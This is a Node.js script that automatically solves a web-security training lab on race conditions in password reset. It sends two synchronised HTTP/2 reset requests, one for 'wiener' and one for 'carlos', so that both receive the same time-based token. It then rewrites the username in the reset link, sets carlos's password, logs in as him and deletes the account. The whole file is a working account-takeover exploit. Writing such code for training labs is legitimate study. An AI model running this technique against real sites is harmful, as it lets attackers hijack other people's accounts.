const http2 = require('node:http2');

const { deleteCarlos, getCsrf, isSolved, labLogin, runLab, textContent } = require('./_common.cjs');

const TITLE = 'Exploiting time-sensitive vulnerabilities';
const PATH = '/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities';
const NEW_PASSWORD = 'RaceReset123!';
const MAX_ATTEMPTS = 20;

async function openEmailClient(page, labUrl) {
  for (const candidate of ['/email', '/email-client', '/emails']) {
    try {
      await page.goto(labUrl + candidate, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const body = await textContent(page);
      if (body && !/not found/i.test(body)) return labUrl + candidate;
    } catch {}
  }

  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const href = await page.evaluate(() => {
    return [...document.querySelectorAll('a[href]')].find((link) => /email client/i.test(link.textContent || '') || /\/email/i.test(link.getAttribute('href') || ''))?.href || null;
  });
  if (!href) throw new Error('Email client not found');
  return href.startsWith('http') ? href : new URL(href, labUrl).toString();
}

async function listInboxTargets(page, emailUrl) {
  await page.goto(emailUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.waitForTimeout(500);
  const hrefs = await page.$$eval('a[href]', (links) => links.map((link) => link.getAttribute('href') || '').filter(Boolean));
  return [emailUrl, ...hrefs.map((href) => (href.startsWith('http') ? href : new URL(href, emailUrl).toString()))]
    .filter((value, index, array) => array.indexOf(value) === index)
    .slice(0, 20);
}

async function findLatestResetLink(page, emailUrl) {
  const targets = await listInboxTargets(page, emailUrl);

  for (const target of targets) {
    await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    const body = await textContent(page);

    const href = await page.evaluate(() => {
      return [...document.querySelectorAll('a[href]')].find((link) => /\/forgot-password\?/i.test(link.getAttribute('href') || ''))?.href || null;
    });
    if (href) return href.startsWith('http') ? href : new URL(href, target).toString();

    const match = body.match(/\/forgot-password\?[^\s"'<>]+/i);
    if (match) return new URL(match[0], target).toString();
  }

  return null;
}

function extractCsrf(html) {
  return html.match(/name="csrf"\s+value="([^"]+)"/i)?.[1] || html.match(/value="([^"]+)"\s+name="csrf"/i)?.[1] || '';
}

function extractCookieHeader(response) {
  if (typeof response.headers.getSetCookie === 'function') {
    return response.headers.getSetCookie().map((value) => value.split(';')[0]).join('; ');
  }
  const value = response.headers.get('set-cookie');
  return value ? value.split(',').map((part) => part.split(';')[0].trim()).join('; ') : '';
}

async function createResetSession(labUrl) {
  const response = await fetch(labUrl + '/forgot-password');
  const html = await response.text();
  return {
    csrf: extractCsrf(html),
    cookie: extractCookieHeader(response),
  };
}

async function triggerTimedResetPair(labUrl) {
  const [first, second] = await Promise.all([
    createResetSession(labUrl),
    createResetSession(labUrl),
  ]);

  const client = http2.connect(labUrl);
  const requests = [
    { ...first, username: 'wiener' },
    { ...second, username: 'carlos' },
  ].map((entry) => {
    const body = new URLSearchParams();
    if (entry.csrf) body.set('csrf', entry.csrf);
    body.set('username', entry.username);
    const payload = body.toString();
    const stream = client.request({
      ':method': 'POST',
      ':path': '/forgot-password',
      'content-type': 'application/x-www-form-urlencoded',
      ...(entry.cookie ? { cookie: entry.cookie } : {}),
    });

    const result = new Promise((resolve, reject) => {
      stream.on('response', () => {});
      stream.on('end', resolve);
      stream.on('error', reject);
      stream.resume();
    });

    stream.write(payload.slice(0, -1));
    return { stream, suffix: payload.slice(-1), result };
  });

  await new Promise((resolve) => setTimeout(resolve, 50));
  requests.forEach(({ stream, suffix }) => stream.end(suffix));
  await Promise.allSettled(requests.map(({ result }) => result));
  client.close();
}

async function setCarlosPasswordFromResetLink(page, resetUrl) {
  const url = new URL(resetUrl);
  if (url.searchParams.has('user')) {
    url.searchParams.set('user', 'carlos');
  } else {
    url.searchParams.set('username', 'carlos');
  }

  await page.goto(url.toString(), { waitUntil: 'domcontentloaded', timeout: 15000 });
  const body = await textContent(page);
  if (!/password|confirm/i.test(body)) return false;

  const fields = await page.evaluate(() => [...document.querySelectorAll('input[name]')].map((input) => input.name));
  const csrf = await getCsrf(page);
  const form = new URLSearchParams();
  if (csrf) form.set('csrf', csrf);
  for (const [name, value] of url.searchParams.entries()) form.set(name, value);
  if (fields.includes('username')) form.set('username', 'carlos');
  if (fields.includes('user')) form.set('user', 'carlos');

  const pw1 = fields.find((name) => /new-password-1|password-1|newpassword1/i.test(name)) || fields.find((name) => /password/i.test(name)) || 'new-password-1';
  const pw2 = fields.find((name) => /new-password-2|password-2|confirm/i.test(name)) || 'new-password-2';
  form.set(pw1, NEW_PASSWORD);
  form.set(pw2, NEW_PASSWORD);

  await page.evaluate(async (payload) => {
    await fetch(location.pathname + location.search, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: payload,
    }).catch(() => {});
  }, form.toString());

  await page.waitForTimeout(1000);
  return true;
}

async function isCarlosSession(page, labUrl) {
  await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
  const body = await textContent(page);
  return /your username is:\s*carlos/i.test(body) || /admin panel/i.test(body);
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    const emailUrl = await openEmailClient(page, labUrl);

    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt += 1) {
      await triggerTimedResetPair(labUrl);

      await page.waitForTimeout(1200);
      const resetUrl = await findLatestResetLink(page, emailUrl);
      console.log(`attempt ${attempt}: ${resetUrl ? `reset-link found (${resetUrl})` : 'miss'}`);
      if (!resetUrl) continue;

      const changed = await setCarlosPasswordFromResetLink(page, resetUrl);
      if (!changed) continue;

      await labLogin(page, labUrl, 'carlos', NEW_PASSWORD);
      if (!(await isCarlosSession(page, labUrl))) continue;
      await deleteCarlos(page, labUrl);
      if (await isSolved(page, labUrl)) return;
    }

    throw new Error('Timed token collision did not yield a usable Carlos reset link');
  },
});
